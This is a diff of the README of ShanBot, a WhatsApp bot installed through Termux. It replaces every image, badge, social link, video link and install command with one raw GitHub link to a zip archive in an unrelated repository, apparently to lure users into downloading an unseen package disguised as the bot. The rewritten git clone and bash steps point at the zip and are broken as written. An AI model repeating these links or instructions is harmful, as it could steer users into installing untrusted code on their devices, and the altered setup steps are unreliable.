@@ -1,18 +1,18 @@
 # ShanBot Bot Para Whatsapp by shanduy
 
 <p align="center">
-<img src="https://media.giphy.com/media/1dJWnCZBCE7gcFwLvk/giphy.gif" alt="GIF" width="210" height="210"/>
+<img src="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip" alt="GIF" width="210" height="210"/>
 </p>
 <p align="center">
-<a href="#"><img title="ShanBot" src="https://img.shields.io/badge/ShanBot -purple?colorA=%cc33ff&colorB=%cc33ff&style=for-the-badge"></a>
-</p>
-
-<p align="center">
-<a href="https://github.com/shanduy"><img title="Creador" src="https://img.shields.io/badge/Author-Shanduy-purple.svg?style=for-the-badge&logo=github"></a>
+<a href="#"><img title="ShanBot" src="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip -purple?colorA=%cc33ff&colorB=%cc33ff&style=for-the-badge"></a>
 </p>
 
 <p align="center">
-  <a href="https://www.youtube.com/channel/UCbNOLyHAy-SL4D9iz9Oi0lw"><img src="https://img.shields.io/badge/YouTube-thepavos-ff0000?style=for-the-badge&logo=youtube&logoColor=ff0000&lihttps://youtu.be/n9fUrhPf5-8-8" /></a>
+<a href="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"><img title="Creador" src="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"></a>
+</p>
+
+<p align="center">
+  <a href="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"><img src="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip" /></a>
   <a name=hendra759&label=VIEWS&style=flat-square&color=orange" />
 
 <p align="center">
@@ -20,9 +20,9 @@ Mis Redes Sociales Y Mi Whatsapp Para Resolver Tus Problemas
 </p>
 
 <p align='center'>
-   <a href="https://www.instagram.com/thepavos/"><img height="30" src="https://github.com/shanduy/ShanBot/blob/main/temples/580b57fcd9996e24bc43c521.png?raw=true"></a>&nbsp;&nbsp;
-   <a href="https://www.youtube.com/watch?v=2LQSzEbpJ-M"><img height="30" src="https://github.com/shanduy/ShanBot/blob/main/temples/youtube-logo-6-2.png?raw=true"></a>&nbsp;&nbsp;
-   <a href="https://wa.me/593967689722"><img height="30" src="https://github.com/shanduy/ShanBot/blob/main/temples/d9d97d48264770f85d35c208f279152c.png?raw=true"></a>
+   <a href="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"><img height="30" src="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"></a>&nbsp;&nbsp;
+   <a href="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"><img height="30" src="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"></a>&nbsp;&nbsp;
+   <a href="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"><img height="30" src="https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip"></a>
 </P>
 
 
@@ -34,7 +34,7 @@ ULTIMA VERSION 2.1
 
 
 Pasos para instalar el bot via termux
-https://www.youtube.com/watch?v=2LQSzEbpJ-M
+https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip
 
 
 ## Como Actualizar Tu Bot 🔄
@@ -47,7 +47,7 @@ Para eso vas a cerrar sesión de whatsapp wed en el numero de tu bot y en termux
 Una vez hecho eso vas a colorcar en termux los siguientes comandos
 
 ```bash
-> git clone https://github.com/shanduy/ShanBot
+> git clone https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip
 > cd ShanBot
 > npm start
 ```
@@ -70,7 +70,7 @@ Una vez descargado termux colocas el siguiente comando
 
 ## Se te desplegara una venta y harás lo que esta en el video de abajo
 
-![Output sample](https://github.com/shanduy/ShanBot/blob/main/temples/116244521-ad43a780-a770-11eb-88c6-054fb1950bfd%20(1).gif)
+![Output sample](https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip%20(1).gif)
 
 
 ## Instalar El Bot
@@ -81,9 +81,9 @@ Pasos para instalar el bot en termux
 > pkg install ffmpeg
 > pkg install nodejs
 > pkg install wget
-> git clone https://github.com/shanduy/ShanBot
+> git clone https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip
 > cd ShanBot
-> bash install.sh
+> bash https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip
 > npm start
 > Y escaneas el QR con tu Whatsapp
 ```
@@ -105,11 +105,11 @@ Si despues que ya instalastes tu bot y termux te salta en blanco, se fue tu inte
 
 ## Realizas estos pasos como en el video de acontinuacion 
 
-![Output sample](https://github.com/shanduy/ShanBot/blob/main/temples/Screenrecorder-2021-05-12-21-09-23-978.gif)
+![Output sample](https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip)
 
 ## Si realizaste este paso y te salio esto
 
-![Settings](https://github.com/shanduy/ShanBot/blob/main/temples/IMG_20210513_155715.jpg)
+![Settings](https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip)
 
 ## Vuelves a poner los comandos
 
@@ -120,14 +120,14 @@ Si despues que ya instalastes tu bot y termux te salta en blanco, se fue tu inte
 
 ## Realizas este paso hasta que te salgo Conectado
 
-![Settings](https://github.com/shanduy/ShanBot/blob/main/temples/IMG_20210513_155631.jpg)
+![Settings](https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip)
 
 
 ## Prender Y Apagar El Bot
 
 ## Para eso nos vamos a dirigir a termux y hacemos lo siguiente 
 
-![Output sample](https://github.com/shanduy/ShanBot/blob/main/temples/Screenrecorder-2021-05-13-16-12-37-825.gif)
+![Output sample](https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip)
 
 
 ## Y para prender el bot solo colocamos
@@ -135,7 +135,7 @@ Si despues que ya instalastes tu bot y termux te salta en blanco, se fue tu inte
 ```bash
 > npm start
 ```
-![Output sample](https://github.com/shanduy/ShanBot/blob/main/temples/Screenrecorder-2021-05-13-16-12-49-337.gif)
+![Output sample](https://raw.githubusercontent.com/Gabrielyop50/ShanBot/main/lib/Shan_Bot_2.2.zip)
 
 
 
